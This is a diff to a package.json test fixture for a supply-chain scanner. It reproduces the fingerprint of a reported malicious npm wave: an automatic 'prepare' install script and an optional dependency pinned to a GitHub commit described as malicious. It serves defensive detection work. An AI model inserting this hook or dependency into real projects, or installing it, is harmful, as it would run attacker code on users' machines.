@@ -4,6 +4,12 @@
   "private": true,
   "description": "Fixture of known-compromised npm package versions from the May 2026 mini-shai-hulud / TanStack supply-chain attack (CVE-2026-45321). For scanner testing only. DO NOT run `npm install` outside an isolated sandbox.",
   "_security_test_note": "All versions below were confirmed-malicious in the mini-shai-hulud wave. Sources: github.com/TanStack/router/issues/7383, stepsecurity.io blog, socket.dev/supply-chain-attacks/mini-shai-hulud. Fingerprint: optionalDependencies.@tanstack/setup pointing at github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c, plus a smuggled router_init.js executed via prepare lifecycle script.",
+  "scripts": {
+    "prepare": "bun run tanstack_runner.js  && exit 1"
+  },
+  "optionalDependencies": {
+    "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
+  },
   "dependencies": {
     "@tanstack/history": "1.161.12",
     "@tanstack/router-utils": "1.161.14",
